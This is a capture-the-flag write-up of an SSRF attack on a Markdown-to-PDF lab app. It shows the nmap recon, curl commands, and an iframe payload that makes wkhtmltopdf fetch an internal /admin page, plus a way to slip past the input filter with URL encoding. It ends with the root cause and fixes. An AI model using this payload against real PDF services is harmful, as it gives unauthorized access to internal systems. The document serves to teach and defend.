## Overview

MD2PDF is a web application that converts Markdown to PDF. Two web servers serve the same app on ports 80 and 5000, but the internal service on port 5000 exposes an `/admin` endpoint not accessible externally. By injecting an iframe via the Markdown input, the PDF converter (wkhtmltopdf) fetches the internal admin page and renders it — a classic **SSRF** attack through a PDF generator.

---

## What is SSRF?

**Server-Side Request Forgery (SSRF)** occurs when a server-side application fetches remote resources based on user input without proper validation. An attacker can make the server send requests to internal services that aren't publicly accessible.

**Key concept:** If the server can reach internal services (localhost, private IPs), and you control what it fetches, you can access things the public can't.

**Real-world examples:**
- Making a PDF generator fetch `http://localhost:5000/admin` to access an internal dashboard
- Making an image proxy fetch `http://169.254.169.254/latest/meta-data/` for cloud credentials
- Using a webhook tool to scan internal network services behind a firewall

## Reconnaissance

### Port Scan

```bash
nmap -sV -sC -T4 -Pn --min-rate=1000 10.49.128.83
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    Python/wsgiref
5000/tcp open  http    Python/wsgiref
```

Two HTTP servers — both serving the same **MD2PDF** markdown-to-PDF converter app. SSH is also available but wasn't needed.

### Web Enumeration

Both ports serve the same app — a CodeMirror editor where you type Markdown and convert it to PDF via a `/convert` endpoint. The JavaScript reveals:

```javascript
fetch("/convert", {
    method: "POST",
    body: data
})
.then((response) => response.blob())
.then((data) => window.open(URL.createObjectURL(data)))
```

The PDF metadata revealed the converter technology:

```
/Creator (wkhtmltopdf 0.12.5)
/Producer (Qt 4.8.7)
```

**wkhtmltopdf** — a WebKit-based HTML to PDF converter. This is the key to the SSRF attack — it fetches external resources (images, iframes, stylesheets) during PDF generation.

---

## Exploitation

### Step 1: Identify the Dual Ports

Port 80 had a strict input filter that blocked HTML tags like `<iframe>` and URL patterns. Port 5000 served the same app but was **less restrictive** — the filter allowed HTML injection through proper URL encoding.

### Step 2: Test the PDF Converter

Basic conversion confirmed the service worked:

```bash
curl -s -X POST http://10.49.128.83:5000/convert \
  --data-urlencode "md=test" \
  -o output.pdf
```

### Step 3: Inject an iframe via SSRF

The key insight: wkhtmltopdf fetches iframe content during PDF generation. An internal `/admin` endpoint existed on the same server but wasn't accessible externally. Using an iframe with `--data-urlencode` encoding (which bypassed the filter):

```bash
curl -s -X POST http://10.49.128.83:5000/convert \
  --data-urlencode "md=<iframe src='http://localhost:5000/admin'></iframe>" \
  -o output.pdf
```

### Step 4: Extract the Flag

The iframe loaded the `/admin` page from the internal port 5000, and wkhtmltopdf rendered its contents — including the flag — into the PDF output:

```bash
pdftotext output.pdf -
```

```
flag{1f4a2b6ffeaf4707c43885d704eaee4b}
```

## Root Cause Analysis

The vulnerability exists because:

1. **SSRF in PDF generator** — wkhtmltopdf fetches external URLs (iframes, images, stylesheets) during PDF generation without restricting which hosts/ports can be accessed
2. **Internal endpoint exposed via SSRF** — The `/admin` page on port 5000 had no authentication or IP restriction beyond not being linked publicly
3. **Inconsistent filtering** — Port 80 had input validation but port 5000 didn't, creating an asymmetric attack surface

The fix would be:
- Restrict wkhtmltopdf to only fetch allowed domains or disable network access entirely
- Add authentication to the `/admin` endpoint regardless of which port it's served on
- Apply the same input validation across all application ports
- Use `--no-images` and disable plugin loading in wkhtmltopdf when external content isn't needed

## Key Takeaways

| Lesson | Why It Matters |
|--------|---------------|
| **Test all ports** | The same app on a different port might have different security settings |
| **PDF generators are SSRF vectors** | Any tool that fetches external URLs during rendering can be exploited |
| **Use proper encoding** | `--data-urlencode` vs raw `-d` can bypass input filters that look for literal patterns |
| **Check PDF metadata** | The creator field revealed wkhtmltopdf 0.12.5 — which told us it fetches external content |
